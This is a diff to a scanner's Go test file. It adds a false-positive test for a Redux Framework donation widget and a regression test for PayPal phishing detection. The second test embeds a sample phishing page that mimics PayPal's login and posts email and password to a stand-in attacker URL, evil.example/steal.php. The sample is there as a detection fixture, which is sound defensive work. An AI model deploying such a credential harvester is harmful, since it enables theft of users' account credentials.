@@ -567,3 +567,54 @@ function noop() {}
 		t.Error("webshell_p0wny FP: matched a single mention of 'p0wny' in a docblock (min_match=2 must hold)")
 	}
 }
+
+// phishing_paypal FP: Salient/Nectar theme's bundled Redux Framework
+// tracking.php (ReduxCore/inc/tracking.php) renders an admin donation
+// widget with a PayPal donation link plus a MailChimp email-subscription
+// <form>. The old YARA rule fired `any of ($brand*) and $form and $action`
+// where $form = /type=['"](?:email|password)['"]/ -- three tokens that any
+// theme admin page mentioning PayPal + offering a newsletter will trip.
+//
+// Credential phishing requires a password field; legitimate
+// donation/subscribe widgets use type="email", never type="password".
+// Tightening the rule to require `type="password"` keeps real phishing
+// detection (credential capture ALWAYS has a password field) and stops
+// the FP class entirely.
+func TestPhishingPaypal_ReduxTrackingDonationWidget(t *testing.T) {
+	scanner := loadRepoScanner(t)
+
+	// Shape reconstructed from the actual firing file: PayPal donation
+	// link on one line, MailChimp subscribe form with type="email" on
+	// the next. No credential capture anywhere.
+	legit := []byte(`<?php
+/**
+ * @package Redux_Tracking
+ */
+$content = '<p><a href="https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=N5AD7TSH8YA5U" target="_blank">donation</a></p>';
+$content .= '<form action="http://reduxframework.us7.list-manage2.com/subscribe/post" method="post"><input type="email" name="EMAIL"><input type="submit" value="Subscribe"></form>';
+`)
+	matches := scanner.ScanContent(legit, ".php")
+	if hasRule(matches, "phishing_paypal") {
+		t.Error("phishing_paypal FP: matched Redux Framework donation+subscribe widget (PayPal donation URL + newsletter email form is not credential phishing)")
+	}
+}
+
+func TestPhishingPaypal_RealCredentialHarvester(t *testing.T) {
+	scanner := loadRepoScanner(t)
+
+	// Classic PayPal credential phishing: brand masquerade + password
+	// capture. The rule must keep firing on this shape.
+	malicious := []byte(`<!doctype html>
+<html><head><title>Log in to your PayPal account</title></head>
+<body>
+<form action="https://evil.example/steal.php" method="post">
+<input type="email" name="email" placeholder="Email">
+<input type="password" name="password" placeholder="Password">
+<input type="submit" value="Log In">
+</form>
+</body></html>`)
+	matches := scanner.ScanContent(malicious, ".html")
+	if !hasRule(matches, "phishing_paypal") {
+		t.Error("phishing_paypal regression: credential-capture PayPal phishing page (brand + password field + form) was not detected")
+	}
+}
